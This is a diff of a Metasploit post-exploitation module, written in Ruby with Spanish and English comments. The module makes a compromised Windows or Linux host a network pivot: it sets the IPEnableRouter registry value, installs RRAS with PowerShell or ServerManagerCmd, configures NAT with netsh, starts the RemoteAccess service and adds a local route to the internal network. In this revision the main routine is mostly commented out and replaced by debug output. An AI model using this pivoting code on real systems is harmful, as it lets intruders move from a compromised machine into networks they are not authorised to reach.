@@ -37,14 +37,7 @@ class MetasploitModule < Msf::Post
 		OptString.new('NInt02', [true, 'Name of pivot network adapter of the other network. Explample: "eth1", "Ethernet", "tap0"...']),
       ])
   end
-  
-	########################################################################################################
-	####################################START_FUNCTIONS#####################################################
-	########################################################################################################
-	
-	#
-	# Get OS of PIVOT
-	#
+	# Obtenemos el OS de instalacion de metasploit
 	def sistema_base?
 		if (Msf::Config.local_directory[0,1])==("/")
 			return "linux"
@@ -63,10 +56,10 @@ class MetasploitModule < Msf::Post
 
 	end
 	
-	#
-	# Get the windows service status in string format
-	#
 	def getStatus(status)
+		#
+		# Get Status in dtring format
+		#
 		
 		case status.to_s
 		when '1'
@@ -79,43 +72,54 @@ class MetasploitModule < Msf::Post
 		return "Unknown status: #{status.to_s}"
 	end
 	
-	#
-	# Windows commands
-	#
 	def windows_pivot()
-
+		#
+		# Windows commands
+		#
 		if is_admin? or is_system?
 		
+			rra_info = service_info("RemoteAccess")
+			rra_status = getStatus(rra_info[:status])
 			key = "HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\"
+			iprouting_status = registry_getvalinfo(key,"IPEnableRouter")["Data"]
+			print_status("Initial values:")
+			print_status("	Service RemoteAccess status: #{rra_status}")
+			print_status("	IPEnableRouter value: #{iprouting_status}")
+			puts("")
 			print_status("Starting the proccess...")			
+			
+			##################################
+			# Bloque de versiones de windows #
+			##################################
+			
 			win_version = session.sys.config.sysinfo
 			
-			# Common to all windows versions
+			# Primer bloque común a todas las versiones
 			
 			print_status("	Enabling IP Router...")
 			
-			# if rra_status != 'Started'
-			if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
-				print_good("	IP Routing is Enabled.")
+			if rra_status != 'Started'
+				if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
+					print_good("	IP Routing is Enabled.")
+				else
+					print_bad("  	There was an error set the IPEnableRouter value.")
+					# Exit.
+				end
 			else
-				print_bad("  	There was an error set the IPEnableRouter value.")
-				# Exit.
+				print_good("	IP Routing is Enabled.")
 			end
-			# else
-				# print_good("	IP Routing is Enabled.")
-			# end
 			
-			# Specific instructions for each windows version
-			print_status("Operating System: #{win_version['OS']}")
+			# Primer bloque especifico para cada version
+						
 			if win_version['OS']=~ /Windows 2008/
 				if have_powershell?
 					print_status("Powershell is installed. Trying to install the services.")
 					# En SSOO de 64 bits hay que ejecutar powershell de 64 bits para que funcione, si la shell/meterpreter es para 32 bits no funciona porque no existe el módulo ServerManager. Habría que comprobarlo en un W2008, W2012 y W2016 de 32 bits.
 					# Windows 2008
-					psh_exec("Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services")
+					print_status(psh_exec("Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services"))
 				else
-					print_status("Powershell is not installed. Trying to install from command line...")
-					cmd_exec("c:\Windows\system32\ServerManagerCmd.exe -install NPAS-RRAS-Services")
+					print_bad("Powershell is not installed. Trying to install from command line...")
+					print_status(cmd_exec("c:\Windows\system32\ServerManagerCmd.exe -install NPAS-RRAS-Services"))
 				end
 			elsif win_version['OS']=~ /Windows 2012/
 				if have_powershell?
@@ -128,24 +132,22 @@ class MetasploitModule < Msf::Post
 				print_bad("The system is not compatible with this module.")
 			end
 			
-			# Common to all windows versions
-			
+			# Segundo bloque comun a todas las versiones
 			print_status(cmd_exec("netsh routing ip nat install"))
 			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
 			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
 			
-			# Specific instructions for each windows version
-			
+			# Segundo bloque especifico para cada version
 			print_status("	Enabling Routing and Remote Access service...")
 			if win_version['OS']=~ /Windows 2012/
 				cmd_exec ("sc config RemoteAccess start= auto")
 				print_status("	Starting Routing and Remote Access service...")
 				cmd_exec("net start RemoteAccess")
-			else
+			else # Resto de versiones hasta el momento, falta probar 2016
 				if service_change_startup("RemoteAccess",2)
 					print_good("	RemoteAccess service enabled.")
 				else
-					print_bad("  	There was an error enabling RemoteAccess service.")l
+					print_bad("  	There was an error enabling RemoteAccess service.")
 					# Exit
 				end
 				print_status("	Starting Routing and Remote Access service...")
@@ -155,68 +157,66 @@ class MetasploitModule < Msf::Post
 					print_bad("  	There was an error starting RemoteAccess service.")
 					# Exit
 				end
-			end			
+			end
+			
+			########Fin bloque############
+	
+			# https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732263(v=ws.11)#BKMK_cmd
+			
 			puts("")
 		else
 			print_bad("You have to be administrator in the pivot machine to execute this module.")
 		end
 	end
+	#
+  	# acciones segun eleccion plataforma
+  	#
+	def set_pivot()
+		case session.platform
+	  	when 'linux'
+		  	# codigo para linux
+		  	linux_pivot()
+		when 'windows'
+		  	# codigo para windows
+			windows_pivot()
+		end
+	end
 	
-	#
-	# cidr to netmask function
-	#
+	#conversion cidr a netmask
 	def get_netmask(eval_net)
 		cidr= eval_net.split("/").last
 		return IPAddr.new('255.255.255.255').mask(cidr).to_s
 	end
-	
-	#
-	# check the format of parameter NET
-	#
+	#check de rnet si cumple formato ip/cidr debe de ser comprobado por OptAddressRange
 	def check_rnet()
-		
-		
 		if get_cidr(datastore['NET']) == false
-			print_bad("You need to provide IPv4 network in NET parameter. Example: 192.168.1.0/24")
+			print_bad("cidr en blanco")
 			return false
 		elsif not((0..33).include?(get_cidr(datastore['NET'])))
-			print_bad("You need to provide IPv4 network in NET parameter. Example: 192.168.1.0/24")
+			print_bad("cidr fuera de rango")
 			return false
 		elsif not(Rex::Socket.is_ipv4?(get_net(datastore['NET'])))
-			print_bad("You need to provide IPv4 network in NET parameter. Example: 192.168.1.0/24")
+			print_bad("no es ipv4")
 			return false
 		else
 			return true
 		end
 	end
-	
-	#
-	# Get network
-	#
+	#funcion obtener red
 	def get_net(eval_net)
-		if eval_net.include? "/"
-			if eval_net.split("/").length == 2
-				return eval_net.split("/").first
-			end
-		end
-		return false
+		return eval_net.split("/").first
 	end
-	
-	#
-	# Get CDIR
-	#
+	#funcion obtener cidr devuelve un integer con el cidr especificado y si no esta devuelve false
 	def get_cidr(eval_net)
 		if eval_net.include? "/"
-			if eval_net.split("/").length == 2
-				return eval_net.split("/").last.to_i
-			end
+			return eval_net.split("/").last.to_i
+		else
+			return false
 		end
-		return false
 	end
 	
-	#
-	# Create the route in local machine
-	# 
+	# Crea la ruta en la máquina local
+	# Obtenemos sistema local:
 	def create_route()
 		print_status("Adding route to target network...")
 		case sistema_base?
@@ -225,21 +225,40 @@ class MetasploitModule < Msf::Post
 				print_good("Route added.")
 			else
 				print_bad("Something was wrong adding local route. Try to add it manually.")
-				print_bad("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
 			end
 		when 'windows'
+		  	# codigo para windows conversion con variables de cidr a netmask y extraccion de red
 			if system("route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
 				print_good("Route added.")
 			else
 				print_bad("Something was wrong adding local route. Try to add it manually")
-				print_bad("route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
 			end
 		end
 	end
 	
-	#
-	# Get the number of interfaces, except loopback
-	#
+	def get_interfaces ()
+		#
+		# Get a list of pivot interfaces, no es muy elegante. Hay que buscar otra forma.
+		#
+		interfaces_dict = {}
+		case session.platform
+		when 'windows'
+			interfaces = cmd_exec('ipconfig').split("\n")
+			counter = 0
+			interfaces.each do |interface|
+				if interface.include? "Ethernet"
+					if interfaces[counter + 4].include? "IPv4"
+						interfaces_dict[interface.gsub("\r","").gsub(" ","").gsub("adapter","").gsub("Adaptadorde","").gsub("Ethernet","").gsub(":","")] = interfaces[counter + 4].gsub(". ","").gsub("IPv4","").gsub("Address","").gsub("Dirección","").gsub(" ","").gsub(":","").gsub("\r","")
+					end
+				end
+				counter = counter + 1
+			end
+		when 'linux'
+			# comandos para linux
+		end
+		return interfaces_dict
+	end
+	#funcion calculo numero de interfaces validas(excluye las loopback)
 	def num_ifaces()
 		iface=client.net.config.interfaces
 		count=0
@@ -249,71 +268,47 @@ class MetasploitModule < Msf::Post
 			end
 		end
 		return count
-	end
+	end #def_ifaces
 	
 	#
-	# Get interfaces name on windows
+	#obtiene los parametros de la interface del pivot, ip de la interface,netmask y nombre, si no es recuperable retorna nulo
 	#
-	def get_if_name(ip)
-		system_ifaces = cmd_exec('ipconfig').split("\n")
-		adapter_name=[]
-		system_ifaces.each do |x|
-			if x.include? "Ethernet"
-				adapter_name=x.split(":").first
-			elsif x.include? " IP" and x.include? ":"
-				ip_iface = x.split(": ")
-				if_ip = ip_iface.last[0..-3]
-				if if_ip == ip
-					return adapter_name
-				end
-			end
-		end
-		return nil
-	end
-
-	#
-	# Get pivot interface name, IPobtiene los parametros de la interface del pivot, ip de la interface,netmask y nombre, si no es recuperable retorna nulo
-	#
-	def gw_interface() #return [remote_int,netmask,name_iface]
+	def gw_interface()
 		local_int=session.tunnel_local.split(":").first
-		# puts("ip local: #{local_int}")
+		#puts("ip local: #{local_int}")
 		remote_int=session.tunnel_peer.split(":").first
-		# puts("ip remota: #{remote_int}")
+		#puts("ip remota: #{remote_int}")
 		iface=client.net.config.interfaces
-		iface.each do |i|
-			if not (i.mac_name =~ /Loopback/ or i.mac_name =~ /lo/)
-				puts(i.mac_name)
-				netmask=i.netmasks[0].to_s
-				host= i.ip + "/" + netmask
-				eval_net = IPAddr.new(host)
-				# print_status("la net local a probar: #{host}")
-				# print_status("la interface local a probar: #{local_int}")
-				local_host= IPAddr.new(local_int)
-				if eval_net.include?(local_host)
-					netmask=i.netmasks[0].to_s																				
-					remote_os=session.sys.config.sysinfo['OS']
-					if remote_os =~ /Linux/
-						return [i.ip,netmask,i.mac_name,eval_net.to_s]
-					elsif remote_os=~ /Windows/
-						if_name=get_if_name(i.ip)
-						return [i.ip,netmask,if_name,eval_net.to_s]
+			iface.each do |i|
+				if not (i.mac_name =~ /Loopback/ or i.mac_name =~ /lo/)
+					netmask=i.netmasks[0].to_s
+					host= i.ip + "/" + netmask
+					eval_net = IPAddr.new(host)
+					#print_status("la net local a probar: #{host}")
+					#print_status("la interface local a probar: #{local_int}")
+					#print_status("la red local es: #{eval_net}")
+					local_host= IPAddr.new(local_int)
+					if eval_net.include?(local_host)
+						netmask=i.netmasks[0].to_s
+						return [remote_int,netmask,i.mac_name]
+						#[0=>ip_interface,1=>netmask_interface,2=>nombre_interfaz]
 					end
+				    end
 				end
-			end
-		end
-		return nil
-	end 
+			return nil
+		end #end gw_interface
 	
 	#
-	# obtiene los parametros de la r_net, ip de la interface remota,netmask, nombre y red, si no es recuperable retorna nulo
+	#obtiene los parametros de la r_net, ip de la interface remota,netmask, nombre y red, si no es recuperable retorna nulo
 	#	
-	def get_rnet()
+		def get_rnet()
 		if num_ifaces() <= 1
-			print_bad("There are not enough interfaces to establish the route.")
+			print_bad("no hay rnet que añadir")
 		elsif num_ifaces() > 2
-			print_bad("There are too many interfaces, add them manualy.")
+			print_bad("hay varias, añadir a mano la objetivo")
 		elsif num_ifaces() == 2
 			l_iface=gw_interface()[0]
+			print_status("linterfaces es: #{l_iface}")
 			r_iface=client.net.config.interfaces
 			r_iface.each do |i|
 				if not(i.mac_name =~ /Loopback/ or i.mac_name =~ /lo/)
@@ -321,36 +316,44 @@ class MetasploitModule < Msf::Post
 						netmask=i.netmasks[0].to_s
 						iface= i.ip + "/" + netmask
 						eval_net = IPAddr.new(iface)
-						remote_os=session.sys.config.sysinfo['OS']
-							if remote_os =~ /Linux/
-								return [i.ip,netmask,i.mac_name,eval_net.to_s]
-							elsif remote_os=~ /Windows/
-								if_name=get_if_name(i.ip)
-								return [i.ip,netmask,if_name,eval_net.to_s]
-							end
+						#print_status("rinterface es: #{i.ip}")
+						#print_status("r_net es: #{eval_net}")
+						return [i.ip,netmask,i.mac_name,eval_net.to_s]
+						#[0=>ip_interface,1=>netmask_interface,2=>nombre_interfaz,3=>red]
 					end
-				 end
+				else
+					return nil
+
+				    end
 			end
+
+		else
+			return nil
 		end
-		return nil
-	end 
-	
-	######################################################################################################
-	####################################END_FUNCTIONS#####################################################
-	######################################################################################################
+	end #end get_rnet
 	
 	#
-  	# MAIN PROGRAM
+  	# funcion principal, donde se invocan los comandos necesarios segun la plataforma
   	#
 	def run
+		
 		if check_rnet()
-			case session.platform
-			when 'linux'
-				linux_pivot()
-			when 'windows'
-				windows_pivot()
-			end
-			create_route()
+			
+			# interfaces_pivot = get_interfaces()
+			# puts(interfaces_pivot.to_s)
+			# puts(session.ipconfig)
+			# print_status("OS: #{session.sys.config.sysinfo['OS']}")
+			# print_status("Computer name: #{'Computer'} ")
+			# print_status("Current user: #{session.sys.config.getuid}")
+			# Get-NetAdapter -Name "*" | Format-List -Property "Name" | findstr ":"
+			print_status(gw_interface().to_s)
+			print_status(get_rnet().to_s)
+			# print_status(psh_exec("Get-Module -ListAvailable"))
+			# set_pivot()
+			# create_route()
+			# para saber si las rutas son correctas
+			# print_status("windows: route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
+			# print_status("linux: route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
 		else
 			print_bad("Aborting Module.")
 		end
